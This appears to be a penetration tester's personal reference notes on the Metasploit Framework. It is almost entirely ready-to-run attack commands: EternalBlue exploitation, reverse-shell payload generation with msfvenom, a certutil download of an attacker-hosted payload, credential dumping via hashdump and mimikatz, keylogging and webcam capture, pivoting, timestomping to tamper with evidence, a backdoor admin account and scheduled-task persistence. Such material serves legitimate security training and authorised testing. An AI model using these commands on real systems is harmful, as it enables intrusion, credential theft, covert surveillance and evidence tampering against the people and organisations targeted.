# Metasploit Framework — Complete Reference

## Table of Contents
- [[#Introduction|Introduction]]
- [[#MSFConsole Basics|MSFConsole Basics]]
- [[#Module Commands|Module Commands]]
- [[#Session Management|Session Management]]
- [[#Database Integration|Database Integration]]
- [[#Post-Exploitation Modules|Post-Exploitation Modules]]
- [[#Resource Scripts (.rc)|Resource Scripts (.rc)]]
- [[#Upgrade Shell to Meterpreter|Upgrade Shell to Meterpreter]]
- [[#Meterpreter Commands|Meterpreter Commands]]
- [[#Meterpreter: Pivoting & Port Forwarding|Meterpreter: Pivoting & Port Forwarding]]
- [[#Payload Generation|Payload Generation]]
- [[#Auxiliary Modules|Auxiliary Modules]]
- [[#Exploit Development|Exploit Development]]
- [[#Persistence|Persistence]]
- [[#Logging & Output|Logging & Output]]
- [[#Troubleshooting|Troubleshooting]]
- [[#Related Notes|Related Notes]]

---

## Introduction

Metasploit Framework (MSF) is the most popular exploitation framework for penetration testing.

### Key Components

| Component | Description |
|-----------|-------------|
| **msfconsole** | Main CLI interface |
| **Modules** | Exploits, payloads, auxiliaries, post, encoders, nops |
| **Payloads** | Code that runs on compromised target |
| **Listeners** | Multi/Handler for receiving reverse connections |
| **Database** | PostgreSQL-backed storage for findings |
| **Resource Scripts** | Automate MSF with .rc files |

---

## MSFConsole Basics

### Starting MSFConsole

```bash
# Start
msfconsole

# Start with database
msfconsole -q  # Quiet mode
msfconsole -r script.rc  # Run resource script
msfconsole -x "use exploit; run"  # Run command immediately
msfconsole -l  # Log all output
```

### Navigation Tips

```text
Tab completion       — Works everywhere
Up arrow             — Command history
Ctrl+L               — Clear screen
Ctrl+C               — Interrupt/stop
Ctrl+Z               — Background job
help                 — Show help
help <command>       — Show command-specific help
```

### Core Commands

```bash
# Workspace management
workspace                # List workspaces
workspace -a <name>      # Create workspace
workspace <name>         # Switch workspace
workspace -d <name>      # Delete workspace

# General
version                  # MSF version
connect                  # Netcat-like connection tool
resource <file>          # Run resource script
route                    # Add/view routes
save                     # Save current state
spool <file>             # Log to file (on/off to toggle)
setg                     # Set global variable
unsetg                   # Unset global variable
```

---

## Module Commands

### Search

```bash
# Basic search
search eternalblue
search apache
search wordpress

# Search by type
search type:exploit eternalblue
search type:auxiliary scanner/smb
search type:post windows

# Search by rank
search rank:great eternalblue
search rank:excellent ms17-010

# Search by date
search cve:2021
search cve:2017-0144

# Search by platform
search platform:windows eternalblue
search platform:linux

# Multiple filters
search type:exploit platform:windows rank:excellent

# Search in names only
search name:tomcat
search name:eternalblue

# Search by author
search author:hdm
search author:joe
```

### Module Usage

```bash
# Select a module
use exploit/windows/smb/ms17_010_eternalblue
use auxiliary/scanner/portscan/tcp
use post/windows/gather/hashdump
use payload/windows/x64/meterpreter/reverse_tcp

# Show module info
info
info exploit/windows/smb/ms17_010_eternalblue

# Show options
show options
show advanced

# Show related items
show payloads        # Compatible payloads
show targets         # Compatible targets
show actions         # For modules with actions

# Set options
set RHOSTS 10.10.14.100
set LHOST 10.10.14.3
set LPORT 4444

# Set to default
unset RHOSTS

# Execute
run                    # Run once
check                  # Check if target is vulnerable
exploit                # Execute (same as run)
run -j                 # Run as background job
exploit -j             # Exploit as background job
exploit -z             # Don't interact with session
```

### Common Modules

```bash
# EternalBlue (MS17-010)
use exploit/windows/smb/ms17_010_eternalblue

# SMB login scanner
use auxiliary/scanner/smb/smb_login

# SSH login scanner
use auxiliary/scanner/ssh/ssh_login

# HTTP version scanner
use auxiliary/scanner/http/http_version

# SMB version
use auxiliary/scanner/smb/smb_version

# Port scan
use auxiliary/scanner/portscan/tcp

# HTTP directory scanner
use auxiliary/scanner/http/dir_scanner

# WebDav scanner
use auxiliary/scanner/http/webdav_scanner
```

---

## Session Management

### List Sessions

```bash
sessions                    # List all sessions
sessions -l                 # List all sessions
sessions -v                 # Verbose list

# Output format:
# Id  Name  Type          Information                Connection
# --  ----  ----          -----------                ----------
# 1         meterpreter   NT AUTHORITY\SYSTEM @ DC   10.10.14.3:4444 -> 10.10.14.100:49158
```

### Interact

```bash
sessions -i 1                # Interact with session 1
sessions -i 1,2,3            # (metasploit will let you pick)
```

### Background

```bash
# From meterpreter session:
background
# Or Ctrl+Z, then 'y'

# From command shell:
Ctrl+Z, then 'y'
```

### Kill Sessions

```bash
sessions -k 1                # Kill session 1
sessions -k 1,2,3            # Kill multiple
sessions -K                  # Kill all sessions
```

### Session Jobs

```bash
jobs                         # List background jobs
jobs -k <id>                 # Kill job
jobs -K                      # Kill all jobs
```

### Upgrade Shell

```bash
# See [[#Upgrade Shell to Meterpreter]] section below
sessions -u 1                # Upgrade session 1 to meterpreter
```

### Session Options

```bash
# Timeout
sessions -t 3600             # Set session timeout (seconds)

# Output to file
sessions -s script.rc 1      # Run script on session
sessions -c "command" 1      # Run command on session
```

---

## Database Integration

Metasploit stores scan results, credentials, and loot in a PostgreSQL database.

### Setup

```bash
# Start database
systemctl start postgresql
msfdb init

# Check status
msfdb status

# Or from msfconsole
db_status
```

### Database Commands

```bash
# Hosts
hosts                     # List all hosts
hosts -c address,os,name  # Show specific columns
hosts -R                  # Add to RHOSTS from results
hosts -d <ip>             # Delete host

# Services
services                  # List services
services -p 445           # Filter by port
services -S "http"        # Search services

# Credentials
creds                     # List credentials
creds -p 445              # Filter by port/service
creds -s smb              # Filter by service

# Loot
loot                      # Show loot items
loot -t <type>            # Filter by type

# Vulns
vulns                     # List vulnerabilities

# Workspaces
workspace                 # List/switch workspaces
workspace -a <name>       # Create workspace
```

### Import Nmap Results

```bash
# From msfconsole
db_import /path/to/nmap.xml

# Or run nmap from msfconsole
db_nmap -sV -p 80,443,445 10.10.14.100
db_nmap -sS -Pn -A 10.10.14.0/24
```

### Database Notes

```bash
notes                     # Show notes
notes -a "SSH key found"  # Add note
notes -d                  # Delete notes
```

---

## Post-Exploitation Modules

### Windows Post Modules

```bash
# Hash dump
use post/windows/gather/hashdump
set SESSION 1
run

# Check if admin
use post/windows/gather/win_privs
set SESSION 1
run

# Enumerate installed apps
use post/windows/gather/enum_applications
set SESSION 1
run

# Enumerate domain info
use post/windows/gather/enum_domain
set SESSION 1
run

# Check UAC
use post/windows/gather/checkvm
set SESSION 1
run

# Credentials from registry
use post/windows/gather/credentials/windows_autologin
set SESSION 1
run

# Get system information
run post/windows/gather/smart_hashdump

# Migrate to safer process
use post/windows/manage/migrate
set SESSION 1
run

# Enable RDP
use post/windows/manage/enable_rdp
set SESSION 1
run

# Keylogging
use post/windows/capture/keylog_recorder
set SESSION 1
run

# LLMNR poisoning
use auxiliary/server/llmnr_response
```

### Linux Post Modules

```bash
# Hash dump (unshadow)
use post/linux/gather/hashdump
set SESSION 1
run

# Check sudoers
use post/linux/gather/checkcontainer
set SESSION 1
run

# Enumerate services
use post/linux/gather/enum_configs
set SESSION 1
run

# Check for containers
use post/linux/gather/checkvm
set SESSION 1
run

# Enumerate system info
use post/linux/gather/enum_system
set SESSION 1
run

# SSH key collection
use post/linux/gather/ssh_creds
set SESSION 1
run

# Find interesting files
use post/multi/gather/ssh_creds
set SESSION 1
run
```

### Multi-Platform Modules

```bash
# Ping sweep
use post/multi/gather/ping_sweep
set SESSION 1
set RHOSTS 172.16.1.0/24
run

# Socks proxy
use auxiliary/server/socks_proxy
set SRVHOST 127.0.0.1
set SRVPORT 1080
run -j
```

---

## Resource Scripts (.rc)

Automate Metasploit with resource scripts. They're just commands that run sequentially.

### Basic Handler Script

Create `handler.rc`:

```
use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 10.10.14.3
set LPORT 4444
set ExitOnSession false
run -j
```

Run: `msfconsole -r handler.rc`

### Full Recon & Exploit Script

Create `autoexploit.rc`:

```
workspace -a AutoRecon
db_nmap -sV -Pn 10.10.14.100
hosts -R
spool /root/msf_output.txt

use auxiliary/scanner/smb/smb_version
set RHOSTS 10.10.14.100
run

use auxiliary/scanner/smb/smb_login
set RHOSTS 10.10.14.100
set SMBUser Administrator
set PASS_FILE /usr/share/wordlists/rockyou.txt
run

use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 10.10.14.100
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 10.10.14.3
set LPORT 4444
run

spool off
```

### Persistence Script

```
use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 10.10.14.3
set LPORT 4444
set ExitOnSession false
run -j

use post/windows/manage/migrate
set SESSION 1
run

use post/windows/gather/hashdump
set SESSION 1
run
```

### Multi-Handler (Multiple Payloads)

```
use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 10.10.14.3
set LPORT 4444
set ExitOnSession false
run -j

use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 10.10.14.3
set LPORT 4445
set ExitOnSession false
run -j

use exploit/multi/handler
set PAYLOAD linux/x64/meterpreter/reverse_tcp
set LHOST 10.10.14.3
set LPORT 4446
set ExitOnSession false
run -j
```

### Resource Script Commands

```bash
resource /path/to/script.rc   # Run from msfconsole
msfconsole -r script.rc       # Run at startup
```

---

## Upgrade Shell to Meterpreter

Convert a standard reverse shell to a full Meterpreter session.

### Method 1: `sessions -u`

```bash
# Requires the shell to be a backgrounded session
sessions -u 1
```

### Method 2: Post Module (shell_to_meterpreter)

```
use post/multi/manage/shell_to_meterpreter
set SESSION 1
set LHOST 10.10.14.3
set LPORT 4433
run
```

### Method 3: Stage Another Payload

```bash
# From the shell, download and run a staged payload
# Generate payload
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.3 LPORT=5555 -f exe -o stage.exe

# Host it
python3 -m http.server 80

# From shell
certutil -urlcache -f http://10.10.14.3/stage.exe stage.exe
.\stage.exe

# In msfconsole
use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 10.10.14.3
set LPORT 5555
run
```

---

## Meterpreter Commands

### Help

```bash
help                    # Show all commands
help <topic>            # Show help for specific topic
```

### System Commands

```bash
sysinfo                 # Get system info
getuid                  # Get current user
getsystem               # Attempt privilege escalation
getpid                  # Get current process ID
ps                      # List processes
kill <pid>              # Kill process
execute -f cmd.exe -i   # Execute command interactively
reboot                  # Reboot the target
shutdown                # Shutdown the target

# Check architecture
sysinfo | grep Arch

# Get environment
getenv PATH
getenv USERNAME
```

### Filesystem Commands

```bash
pwd                     # Print working directory
cd <dir>                # Change directory
ls                      # List files
cat <file>              # View file
edit <file>             # Edit file (vim-like)
upload <local> <remote> # Upload file
download <remote> <local> # Download file
mkdir <dir>             # Create directory
rm <file>               # Remove file
rmdir <dir>             # Remove directory
search -f *.txt         # Search for files
search -f *.doc -d C:\  # Search in specific directory
getlwd                  # Local working directory
lcd                     # Local cd
lpwd                    # Local pwd
```

### Network Commands

```bash
ipconfig / ifconfig     # Network config
route                   # View routing table
arp                     # View ARP table
netstat -ano            # View network connections
netstat -anp tcp        # Filter by TCP
portfwd add -l 3389 -p 3389 -r 172.16.1.100  # Port forward
portfwd delete -l 3389  # Delete port forward
portfwd list            # List forwards
```

### Process Migration

```bash
# List processes
ps

# Migrate to a system process
migrate <PID>
migrate -N lsass.exe     # Migrate by name
migrate -N svchost.exe   # Stable process choice

# Automatic migration to explorer
steal_token <PID>        # Steal token from process
```

### Privilege Escalation

```bash
getsystem                # Attempt SYSTEM
getsystem -t 1           # Technique 1: Service
getsystem -t 2           # Technique 2: Named Pipe
getsystem -t 3           # Technique 3: Token Duplication
getsystem -t 4           # Technique 4: Named Pipe (RPCSS)

# Check current privileges
getprivs

# Enable all tokens
use incognito
list_tokens -u
impersonate_token "DOMAIN\\Administrator"
```

### Credential Dumping

```bash
hashdump                 # Dump SAM hashes
smart_hashdump           # Dump SAM + NTDS
run post/windows/gather/hashdump

# Kiwi (Mimikatz for meterpreter)
load kiwi
creds_all
creds_msv
creds_kerberos
creds_wdigest
creds_livessp
kiwi_cmd "privilege::debug" "sekurlsa::logonpasswords"

# Dump Chrome passwords
run post/windows/gather/chrome_cookies
```

### Screen Capture

```bash
screenshot               # Take screenshot
screengrab               # Alternative screenshot
record_mic -d 10         # Record microphone for 10 seconds
webcam_snap              # Take webcam photo
webcam_list              # List webcams
keyscan_start            # Start keylogging
keyscan_dump             # Dump keylog buffer
keyscan_stop             # Stop keylogging

# Desktop interaction
enumdesktops             # List desktops
setdesktop <id>          # Switch to desktop
```

### Shell Access

```bash
shell                    # Drop to command shell
# Ctrl+Z, then 'y' to background
```

### Persistence

```bash
# Run persistence module
run persistence -X -i 30 -p 4444 -r 10.10.14.3

# With autorun script
run persistence -X -i 30 -p 4444 -r 10.10.14.3 -A

# Schedule persistence
run scheduleme -m 1 -u /path/to/payload.exe

# Advanced persistence via service
run exploit/windows/local/persistence_service
```

### Timestomp

```bash
# Manipulate file timestamps
timestomp -v <file>          # View timestamps
timestomp <file> -c "06/15/2024:10:00:00"  # Change creation time
timestomp <file> -m "06/15/2024:10:00:00"  # Change modified time
timestomp <file> -a "06/15/2024:10:00:00"  # Change access time
timestomp <file> -z <ref_file>  # Copy timestamps from another file
```

---

## Meterpreter: Pivoting & Port Forwarding

### Add Route

```bash
# From meterpreter
run autoroute -s 172.16.1.0/24

# Check routes
run autoroute -p
```

### Port Forward

```bash
# Forward internal port to local
portfwd add -L 127.0.0.1 -l 3389 -p 3389 -r 172.16.1.100
# Now: rdesktop 127.0.0.1:3389

# List forwards
portfwd list

# Delete forward
portfwd delete -L 127.0.0.1 -l 3389 -p 3389 -r 172.16.1.100
```

### SOCKS Proxy via MSF

```
# After adding route
use auxiliary/server/socks_proxy
set SRVHOST 127.0.0.1
set SRVPORT 1080
run -j

# Now proxychains any tool through 127.0.0.1:1080
```

### Exploit Through Session

```bash
# From msfconsole (not meterpreter)
route add 172.16.1.0/24 255.255.255.0 <session_id>

# Now scan/exploit through the session
use auxiliary/scanner/portscan/tcp
set RHOSTS 172.16.1.0/24
run
```

---

## Payload Generation

### Common Reverse TCP Payloads

```bash
# Windows x64 Meterpreter
set PAYLOAD windows/x64/meterpreter/reverse_tcp

# Windows x64 Shell
set PAYLOAD windows/x64/shell_reverse_tcp

# Linux x64 Meterpreter
set PAYLOAD linux/x64/meterpreter/reverse_tcp

# Linux x86 Meterpreter
set PAYLOAD linux/x86/meterpreter/reverse_tcp

# Python Meterpreter
set PAYLOAD python/meterpreter/reverse_tcp

# PHP Meterpreter
set PAYLOAD php/meterpreter/reverse_tcp

# Java Meterpreter
set PAYLOAD java/meterpreter/reverse_tcp
```

### Staged vs Stageless

| Type | Naming | Behavior |
|------|--------|----------|
| Staged | `reverse_tcp` | Small stager → fetches rest of payload |
| Stageless | `reverse_tcp` → `meterpreter_reverse_tcp` | Self-contained |
| Staged | `shell_reverse_tcp` | Small stager → shell | 
| Stageless | `meterpreter_reverse_tcp` | Full meterpreter in one |

### Multi/Handler Setup

```bash
use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 10.10.14.3
set LPORT 4444
set ExitOnSession false   # Stay listening after session
set AutoRunScript post/windows/manage/migrate  # Auto-migrate
run -j                     # Run as job
```

### List Available Payloads

```bash
show payloads               # In module context
show payloads -t staged     # Filter
```

---

## Auxiliary Modules

### Scanner Modules

```bash
# Port scanner
use auxiliary/scanner/portscan/tcp
set RHOSTS 10.10.14.100-150
set PORTS 80,443,445,3389
set THREADS 20
run

# SMB scanner
use auxiliary/scanner/smb/smb_version
set RHOSTS 10.10.14.0/24
run

# SMB login
use auxiliary/scanner/smb/smb_login
set RHOSTS 10.10.14.100
set USER_FILE users.txt
set PASS_FILE passwords.txt
set SMBUser Administrator
run

# SSH login
use auxiliary/scanner/ssh/ssh_login
set RHOSTS 10.10.14.100
set USERPASS_FILE /path/to/combos.txt
run

# HTTP enumeration
use auxiliary/scanner/http/robots_txt
set RHOSTS 10.10.14.100
run

# MySQL enumeration
use auxiliary/scanner/mysql/mysql_version
set RHOSTS 10.10.14.100
run

# MSSQL enumeration
use auxiliary/scanner/mssql/mssql_ping
set RHOSTS 10.10.14.100
run
```

### Other Notable Auxiliary Modules

```bash
# DNS enum
use auxiliary/gather/dns_enum
set DOMAIN target.com
run

# SMB shares
use auxiliary/scanner/smb/smb_enumshares
set RHOSTS 10.10.14.100
run

# HTTP directory scanner
use auxiliary/scanner/http/dir_scanner
set RHOSTS 10.10.14.100
set THREADS 50
run

# SMB2/3 check
use auxiliary/scanner/smb/smb2
set RHOSTS 10.10.14.100
run

# WMI query
use auxiliary/scanner/smb/impacket/wmi_query
set RHOSTS 10.10.14.100
run
```

---

## Exploit Development

### Finding Exploits

```bash
# Search by CVE
search cve:2021-1675  # PrintNightmare
search cve:2017-0144  # EternalBlue
search cve:2020-1472  # Zerologon

# Search by service
search type:exploit platform:windows name:rdp
search type:exploit name:tomcat
search type:exploit platform:linux name:ssh

# Search by rank
search rank:excellent type:exploit
search rank:great type:exploit
```

### Exploit Configuration

```bash
# Check your options
show options
show advanced
show targets

# Set RHOST target(s)
set RHOSTS 10.10.14.100
set RPORT 445

# Set payload
set PAYLOAD windows/x64/meterpreter/reverse_tcp

# Check first
check

# Run
run

# Run with target selection
set TARGET 0
run
```

### Custom Exploits

```bash
# Load custom exploit from file
loadpath /path/to/modules

# Reload module after editing
reload_all

# Edit module directly from msfconsole
edit /usr/share/metasploit-framework/modules/exploits/multi/http/my_exploit.rb
```

---

## Persistence

### Windows Persistence

```bash
# Meterpreter persistence
run persistence -X -i 30 -p 4444 -r 10.10.14.3

# Via service
run exploit/windows/local/persistence_service

# With elevated privs
run post/windows/manage/sticky_keys

# Create local admin
execute -f cmd.exe -c "net user hacker Password123! /add && net localgroup administrators hacker /add"

# RDP enable
run post/windows/manage/enable_rdp
```

### Scheduled Task Persistence

```bash
# Create scheduled task
shell
schtasks /create /tn "Updater" /tr "C:\payload.exe" /sc onlogon /ru SYSTEM
schtasks /create /tn "Updater" /tr "C:\payload.exe" /sc daily /st 09:00
```

---

## Logging & Output

```bash
spool /tmp/msf_output.txt   # Start logging to file
spool off                    # Stop logging

# Log all console I/O
set ConsoleLogging true
set SessionLogging true

# Save workspace state
save

# Export database
db_export -f xml /path/to/output.xml
```

---

## Troubleshooting

### Common Issues

| Issue | Solution |
|-------|----------|
| `[-] Failed to connect to the database` | Start PostgreSQL: `systemctl start postgresql` |
| `[-] Exploit failed: No target specified` | Set `RHOSTS` |
| `[-] Exploit failed: Payload not compatible` | Run `show payloads`, choose compatible one |
| Meterpreter session dies immediately | Try `set EXITFUNC thread` or migrate process |
| `[-] Failed to load module: Msf::OptionValidateError` | Check required options with `show options` |
| Cannot use `sessions -u` | Use `post/multi/manage/shell_to_meterpreter` instead |
| Payload not executing | Check AV; try encoding or different payload type |
| `[-] Connection refused` | Port blocked; try a different port or reverse payload |
| Session timeout | Adjust `SessionCommunicationTimeout` and `SessionExpirationTimeout` |

### Debugging

```bash
# Set debug mode
setg VERBOSE true
setg EnableContextEncoding true

# Payload debugging
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set DebugBuild true

# Check module dependencies
info -d exploit/...

# Test connection
connect 10.10.14.100 445
```

---

## Useful One-Liners

```bash
# Start handler from command line
msfconsole -q -x "use multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST 10.10.14.3; set LPORT 4444; run"

# Run nmap from MSF
msfconsole -q -x "db_nmap -sV 10.10.14.100; hosts; services; exit"

# Auto-exploit with resource
msfconsole -r /path/to/handler.rc

# Generate payload + handler
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.3 LPORT=4444 -f exe -o shell.exe
msfconsole -q -x "use multi/handler; set PAYLOAD windows/x64/shell_reverse_tcp; set LHOST 10.10.14.3; set LPORT 4444; run"
```

---

## Related Notes

- [[06 - Shells and Payloads/6.4 Payload Generation/MSFVenom Reference]]
- [[06 - Shells and Payloads/6.1 Reverse Shells/Reverse Shell Compendium]]
- [[06 - Shells and Payloads/6.5 File Transfers/File Transfer Techniques]]
- [[12 - Pivoting and Port Forwarding/Pivoting Techniques]]
- [[04 - Password Attacks/4.4 Kerberos Attacks/Kerberos Attacks]]
